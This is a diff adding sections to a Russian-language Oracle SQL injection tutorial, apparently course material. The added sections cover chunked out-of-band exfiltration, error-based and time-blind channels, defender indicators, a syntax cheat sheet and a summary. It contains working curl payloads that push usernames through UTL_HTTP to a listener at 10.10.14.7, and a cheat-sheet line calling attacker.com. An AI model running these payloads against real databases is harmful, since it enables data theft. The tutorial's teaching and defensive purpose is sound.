@@ -135,6 +135,63 @@ Oracle-приложения часто вызывают PL/SQL-процедур�
 - **UTL_HTTP/UTL_INADDR отключены.** Часто закрыты ACL-политикой; тогда пробуй `CTXSYS`/`DBMS_XMLGEN` error-based.
 - **sqlmap.** `sqlmap -r request.txt -p id --batch --dbms=oracle --dbs`; для OOB — `--dns-domain` или `--os-shell` через Java.
 
+## Шаг 7: собираем длинные строки из OOB-запросов
+
+OOB-канал несёт ограниченный объём: имя хоста в DNS ограничено, URL в HTTP — тоже. Поэтому данные
+режут на части и склеивают из нескольких запросов. В Oracle для этого удобны `SUBSTR` и `CHR`:
+
+```bash
+# первая часть
+$ curl -s "https://erp.example/report?id=1 AND 1=(SELECT UTL_HTTP.REQUEST('http://10.10.14.7/'||(SELECT SUBSTR(username,1,10) FROM users WHERE rownum=1)) FROM dual)-- -"
+# вторая часть
+$ curl -s "https://erp.example/report?id=1 AND 1=(SELECT UTL_HTTP.REQUEST('http://10.10.14.7/'||(SELECT SUBSTR(username,11,10) FROM users WHERE rownum=1)) FROM dual)-- -"
+```
+
+На listener'е появляются два запроса: `/ADMIN` и `/ISTRATOR` — склеив, получаем `ADMINISTRATOR`. Так
+же посимвольно вытаскивают хеши паролей и любые длинные значения. Для удобства части кодируют в hex
+(через `RAWTOHEX`), чтобы не терять спецсимволы в URL.
+
+## Шаг 8: когда OOB закрыт — error-based и time-blind
+
+Если `UTL_HTTP`/`UTL_INADDR` отключены ACL-политикой (частая практика в hardened-БД), OOB
+недоступен. Тогда:
+
+- **error-based** — `CTXSYS.DRITHSX.SN`, `DBMS_XMLGEN.GETXML`, `XMLType`. Данные попадают в текст
+  `ORA-20000`/`ORA-292257`, их вытаскивают регуляркой.
+- **time-blind** — `dbms_pipe.receive_message('a',N)` как булев оракул: 5 секунд = «истина». Медленно
+  (бит за бит), но работает при полном отсутствии вывода и OOB.
+
+Порядок выбора канала: UNION → error-based → OOB (HTTP, затем DNS) → time-blind. Начинай с самого
+быстрого и падай к более медленному по мере закрытия предыдущих.
+
+## Как это видят защитники
+
+Oracle-инъекции оставляют следы в логах СУБД и на периметре:
+
+- **`ORA-` ошибки** в логах приложения/БД (`ORA-01756`, `ORA-00933`) — попытка инъекции;
+- **исходящие HTTP/DNS** от сервера БД к внешним адресам — работа `UTL_HTTP`/`UTL_INADDR` (OOB);
+- **запросы к `all_tables`/`user_tab_columns`/`v$version`** — разведка схемы;
+- **`dbms_pipe.receive_message`** с нетипичной задержкой — time-blind.
+
+Правильная защита — параметризованные запросы (bind-переменные) и минимум прав: отключённые
+`UTL_HTTP`/`UTL_INADDR`, закрытые ACL, отсутствие `DBA_*`. Тогда инъекция если и есть, то дампа не
+даёт.
+
+## Шпаргалка: синтаксис Oracle для инъекций
+
+| Задача | Oracle |
+|---|---|
+| Комментарий | `--` (и `/* */`); `#` не работает |
+| Виртуальный SELECT | `... FROM dual` |
+| Ограничить строки | `WHERE rownum=1` / `FETCH FIRST 1 ROWS ONLY` |
+| Конкатенация | `||` |
+| Агрегация строк | `LISTAGG(col,',') WITHIN GROUP (ORDER BY col)` |
+| Каталог | `all_tables`, `all_tab_columns`, `user_tables` |
+| Версия | `v$version` |
+| Задержка | `dbms_pipe.receive_message('a',N)` |
+| OOB HTTP | `UTL_HTTP.REQUEST('http://...')` |
+| OOB DNS | `UTL_INADDR.GET_HOST_ADDRESS('x.attacker.com')` |
+
 ## На что смотреть дальше
 
 - **Нет `information_schema`.** Твой каталог — `all_tables`/`user_tables`/`all_tab_columns`.
@@ -142,7 +199,18 @@ Oracle-приложения часто вызывают PL/SQL-процедур�
 - **Регистр в Oracle важен.** Идентификаторы по умолчанию в верхнем регистре.
 - **Error-based богат:** `CTXSYS`, `XMLType`, `UTL_INADDR` — выбирай, что разрешено.
 - **OOB — спасение в слепой зоне.** DNS-запрос через `UTL_INADDR` проходит чаще HTTP.
-- **RCE через Java stored procs** — редко и требует прав; фиксируй дамп/OOB как основной артефакт.
+- **RCE через Java stored procs** — редко и требует прав; фиксируй дамп/OOB как основной артефакт и не
+  рискуй стабильностью БД ради него.
+
+## Что мы теперь знаем
+
+- Oracle отличается от других СУБД: `FROM dual`, `ROWNUM`/`FETCH FIRST` вместо `LIMIT`, `||` для
+  конкатенации и идентификаторы в ВЕРХНЕМ регистре.
+- Каталог схемы — `all_tables`/`user_tables`/`all_tab_columns`, версия — `v$version`.
+- Каналы вывода по убыванию скорости: UNION → error-based (`CTXSYS`, `DBMS_XMLGEN`) → OOB
+  (`UTL_HTTP`/`UTL_INADDR`) → time-blind (`dbms_pipe`).
+- OOB переносит данные частями (`SUBSTR`) в поддомене/URL; DNS проходит чаще HTTP.
+- Защита — bind-переменные и минимум прав (без `UTL_*`, `DBA_*`), а также отключённая Java в БД.
 
 ## Квиз
 
